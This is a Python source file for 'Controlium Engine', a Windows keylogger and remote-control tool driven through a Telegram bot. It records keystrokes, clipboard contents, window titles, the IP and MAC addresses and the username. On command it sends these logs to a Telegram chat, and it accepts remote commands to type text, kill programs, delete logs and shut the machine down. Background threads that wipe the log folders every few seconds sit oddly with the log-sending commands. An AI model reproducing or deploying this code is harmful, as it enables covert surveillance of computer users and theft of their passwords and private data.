import os
import time
import uuid
import logging
import socket
import datetime
import subprocess
import threading
import psutil
import ctypes
import pygame.mixer
import pyperclip
import pyautogui
import telebot
import requests
import winshell
import webbrowser
import pyttsx3
import pygetwindow as gw
from pynput import keyboard
from plyer import notification


def telegram_alert(send):
    bot_token = "BOT TOKEN"
    my_chatID = "CHAT ID"
    send_text = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + my_chatID + "&parse_mode=Markdown&text=" + send

    response = requests.get(send_text)
    return response.json()

def win_notification(message):
    msg = message.text
    notification.notify(
        title="Windows Notification",
        message=msg,
        app_icon=None,
        timeout=5,)
    
incognito = False

bot = telebot.TeleBot("BOT TOKEN")
@bot.message_handler(func=lambda message: True)

def command_engine(message):
    global incognito

    try:
        if message.text.lower() == "stop":
            notification.notify(
                title="Windows Notification",
                message="Control program terminated",
                app_icon=None,
                timeout=3,)
            
            bot.reply_to(message, "Engine shutdown")
            subprocess.run(["taskkill", "/F", "/PID", str(pid)])

        elif message.text.lower() == "log":
            try:
                with open(save_log_file, 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "keylog":
            try:
                with open(key_log_file, 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "notepad":
            os.startfile(f"C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/notepad.exe")
            bot.reply_to(message, "Opened Notepad")

        elif message.text.lower() == "chrome":
            os.startfile("C:\Program Files\Google\Chrome\Application\chrome.exe")
            bot.reply_to(message, "Opened Chrome")

        elif message.text.lower() == "vscode":
            os.startfile(f"C:/Users/{username}/AppData/Local/Programs/Microsoft VS Code/Code.exe")
            bot.reply_to(message, "Opened Visual Studio Code")

        elif message.text.lower() == "word":
            os.startfile("C:/Program Files/Microsoft Office/root\Office16/WINWORD.EXE")
            bot.reply_to(message, "Opened Microsoft Word")

        elif message.text.lower() == "powerpoint":
            os.startfile("C:/Program Files/Microsoft Office/root/Office16/POWERPNT.EXE")
            bot.reply_to(message, "Opened PowerPoint")

        elif message.text.lower() == "excel":
            os.startfile("C:/Program Files/Microsoft Office/root/Office16/EXCEL.EXE")
            bot.reply_to(message, "Opened Microsoft Excel")

        elif message.text.lower() == "edge":
            os.startfile("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
            bot.reply_to(message, "Opened Microsoft Edge")

        elif message.text.lower() == "files":
            os.startfile("C:/Windows/explorer.exe")
            bot.reply_to(message, "Opened File Explorer")

        elif message.text.lower() == "alert":
            bot.reply_to(message, "Enter messeage")
            bot.register_next_step_handler(message, win_notification)
            bot.reply_to(message, "Done")

        elif message.text.lower() == "bg":
            img_path = "C:/Users/ashfa/OneDrive/Documents/Projects/Controlium Engine (PY12824)/Images/test4.jpg"
            #ctypes.windll.user32.SystemParametersInfoW(20, 0, "test2.jpg", 0)
            bot.reply_to(message, "Changed wallpaper")

        elif message.text.lower() == "sound1":
            pygame.mixer.init()
            pygame.mixer.music.load("Sounds/sound1.mp3")
            pygame.mixer.music.play(-1)
            bot.reply_to(message, "Playing sound")

        elif message.text.lower() == "sound2":
            pygame.mixer.init()
            pygame.mixer.music.load("Sounds/sound2.mp3")
            pygame.mixer.music.play(-1)
            bot.reply_to(message, "Playing sound")

        elif message.text.lower() == "sound3":
            pygame.mixer.init()
            pygame.mixer.music.load("Sounds/sound3.mp3")
            pygame.mixer.music.play(-1)
            bot.reply_to(message, "Playing sound")

        elif message.text.lower() == "sound stop":
            pygame.mixer.music.stop()
            bot.reply_to(message, "Sound stopped")

        elif message.text.lower() == "close all":
            active_window = gw.getActiveWindow()
            active_window.close()
            bot.reply_to(message, "Closed all windows")

        elif message.text.lower() == "close focus":
            pyautogui.hotkey('ctrl', 'alt', 'down')
            bot.reply_to(message, "Closed window in focus")

        elif message.text.lower() == "enter":
            pyautogui.hotkey('enter')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "undo":
            pyautogui.hotkey('ctrl', 'z')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "copy":
            pyautogui.hotkey('ctrl', 'c')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "paste":
            pyautogui.hotkey('ctrl', 'v')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "select all":
            pyautogui.hotkey('ctrl', 'a')
            bot.reply_to(message, "Done")

        elif "#" in message.text.lower():
            user_chars = message.text
            pyautogui.typewrite(user_chars)
            bot.reply_to(message, "Done")

        elif message.text.lower() == "close chrome":
            os.system("taskkill /f /im chrome.exe")
            bot.reply_to(message, "Closed Chrome")

        elif message.text.lower() == "close excel":
            os.system("taskkill /f /im excel.exe")
            bot.reply_to(message, "Closed Microsoft Excel")

        elif message.text.lower() == "close word":
            os.system("taskkill /f /im winword.exe")
            bot.reply_to(message, "Closed Microsoft Word")

        elif message.text.lower() == "close powerpoint":
            os.system("taskkill /f /im POWERPNT.EXE")
            bot.reply_to(message, "Closed PowerPoint")

        elif message.text.lower() == "close vscode":
            os.system("taskkill /f /im Code.exe")
            bot.reply_to(message, "Closed VScode")

        elif message.text.lower() == "sign out":
            subprocess.call(["shutdown", "/l"])
            bot.reply_to(message, "System sign out")

        elif message.text.lower() == "hibernate":
            os.system("shutdown /h")
            bot.reply_to(message, "System hibernation")

        elif message.text.lower() == "shutdown":
            os.system("shutdown /s /t 30")
            bot.reply_to(message, "System shutdown")

        elif message.text.lower() == "clear bin":
            winshell.recycle_bin().empty(confirm=False, show_progress=True, sound=True)
            bot.reply_to(message, "Recycle bin cleared")

        elif message.text.lower() == "incog":
            incognito = True
            bot.reply_to(message, "Incognito mode enabled")

        elif message.text.lower() == "dis incog":
            incognito = False
            bot.reply_to(message, "Incognito mode disabled")

        elif message.text.lower() == "clear logs":
            try:
                act_log = "Activity Logs"
                txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]

                for f in txtfiles:
                    os.remove(os.path.join(act_log, f))
                bot.reply_to(message, "Deleted activity logs")

            except Exception as e:
                bot.reply_to(message, "Deleted activity logs")
                bot.reply_to(message, f"ERROR >> {e}")
        
        elif "clean" in message.text.lower():
            month = message.text.split()[1].capitalize()
            
            try:
                act_log = "Activity Logs"
                txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt") and f.startswith(month)]

                for f in txtfiles:
                    os.remove(os.path.join(act_log, f))
                bot.reply_to(message, f"Deleted logs: {month}")

            except Exception as e:
                bot.reply_to(message, f"ERROR >> {e}")

        elif message.text.lower() == "clear keylogs":
            key_log = "Keystroke Logs"
            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]

            for f in txtfiles2:
                os.remove(os.path.join(key_log, f))
            bot.reply_to(message, "Deleted keystroke logs")

        elif ">" in message.text.lower():
            usr_msg = message.text
            speech_engine(usr_msg)
            bot.reply_to(message, "Done")

        elif message.text.lower() == "time":
            time = datetime.datetime.now().strftime("%H:%M")
            speech_engine(f"The time is {time}")
            bot.reply_to(message, "Done")

        elif "search" in message.text.lower():
            indx = message.text.lower().split().index("search")
            conv = message.text.split()[indx + 1:]
            query = ' '.join([str(item) for item in conv])
            webbrowser.open(f"https://www.google.com/search?q={query}")
            bot.reply_to(message, f"Searching {query}")

        else:
            bot.reply_to(message, "Invalid command")
            
    except Exception as e:
        bot.reply_to(message, f"ERROR >> {e}")

###############################################################################################

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
username = os.getlogin()
cpu_usage = psutil.cpu_percent(interval=1)
ram = psutil.virtual_memory()
ram_used = ram.used / (1024**3)
ram_available = ram.available / (1024**3)
boot_time = psutil.boot_time()
uptime = datetime.datetime.fromtimestamp(boot_time)
pid = os.getpid()


folder1 = os.path.exists("Activity Logs")
if folder1 == False:
    os.mkdir("Activity Logs")
folder2 = os.path.exists("Keystroke Logs")
if folder2 == False:
    os.mkdir("Keystroke Logs")

date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-Log.txt"
folder = "Activity Logs"
save_log_file = os.path.join(folder, log_file)

date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-key-log.txt"
folder = "Keystroke Logs"
key_log_file = os.path.join(folder, log_file)

logging.basicConfig(filename=save_log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
logged_windows = set()


def log_windows():
    try:
        global logged_windows
        open_windows = gw.getWindowsWithTitle("")
        for window in open_windows:
            if window.title not in logged_windows:
                logging.info(f"Opened {window.title}")
                logged_windows.add(window.title)

                if window.title == "This PC":
                    logging.info("Opened File Explorer")
                elif window.title == "D:/":
                    logging.info("Opened Local Disk")
                elif window.title == "E:/":
                    logging.info("Opened Local Disk")

        for title in logged_windows.copy():
            if title not in gw.getAllTitles():
                logging.info(f"Closed {title}")
                logged_windows.remove(title)
    except:
        pass


def key_press(key):
    if incognito != True:

        try:
            with open(key_log_file, "a") as f:
                f.write(f"Key pressed: {key.char}\n")
        except AttributeError:
            with open(key_log_file, "a") as f:
                f.write(f"Key pressed: {key}\n")
        if key == keyboard.Key.print_screen:
            logging.info("Screenshot taken")

def key_release(key):
    if key == keyboard.Key.esc:
        return False
    

def log_keystrokes():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    with open(key_log_file, "a") as f:
        f.write(f'''CONTROLIUM ENGINE v1.5.2
{str(time_stamp)}
<< KEYSTROKE LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}
> Process ID: {pid}

''')
    with keyboard.Listener(on_press=key_press, on_release=key_release) as watcher:
        watcher.join()


def log_activity():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    logging.info(f'''CONTROLIUM ENGINE v1.5.2
{str(time_stamp)}
<< ACTIVITY LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}
> Process ID: {pid}
''')
    while True:
        if incognito != True:
            log_windows()


def network_connection():
    result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    output = result.stdout
    ssid_line = [line for line in output.splitlines() if "SSID" in line]

    if ssid_line:
        ssid = ssid_line[0].split(":")[1].strip()
        logging.info(f"Connected to network: {ssid}")
    else:
        logging.info("Not connected to a network")


def clipboard_activity():
    before_clipboard = pyperclip.paste()

    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard != before_clipboard and incognito != True:
            logging.info(f"Clipboard changes: {current_clipboard}")
            before_clipboard = current_clipboard


def clear_logs():
    while True:
        try:
            act_log = "Activity Logs"
            txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]

            time.sleep(5)
            for f in txtfiles:
                os.remove(os.path.join(act_log, f))
        except:
            pass

def clear_keystrokes():
    while True:
        try:
            key_log = "Keystroke Logs"
            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]

            time.sleep(5)
            for f in txtfiles2:
                os.remove(os.path.join(key_log, f))
        except:
            pass


def telegram_bot():
    while True:
        try:
            telegram_alert(f"System online - {username}")
            bot.polling()
        except:
            time.sleep(5)

def speech_engine(speak):
    engine = pyttsx3.init("sapi5")
    engine.setProperty("rate", 150)
    voices = engine.getProperty('voices')
    engine.setProperty("voice", voices[0].id)
    engine.say(speak)
    engine.runAndWait()


##########################################################################################

if __name__ == "__main__":
    keystroke_thread = threading.Thread(target=log_keystrokes)
    activity_thread = threading.Thread(target=log_activity)
    network_thread = threading.Thread(target=network_connection)
    clipboard_thread = threading.Thread(target=clipboard_activity)
    clear_logs_thread = threading.Thread(target=clear_logs)
    clear_keystrokes_thread = threading.Thread(target=clear_keystrokes)
    telegram_bot_thread = threading.Thread(target=telegram_bot)

    keystroke_thread.start()
    activity_thread.start()
    network_thread.start()
    clipboard_thread.start()
    clear_logs_thread.start()
    clear_keystrokes_thread.start()
    telegram_bot_thread.start()

    keystroke_thread.join()
    activity_thread.join()
    network_thread.join()
    clipboard_thread.join()
    clear_logs_thread.join()
    clear_keystrokes_thread.join()
    telegram_bot_thread.join()






# MIT License
# Copyright (c) 2024 Ashfaaq Rifath
# All rights reserved.

# USE WITH CAUSION
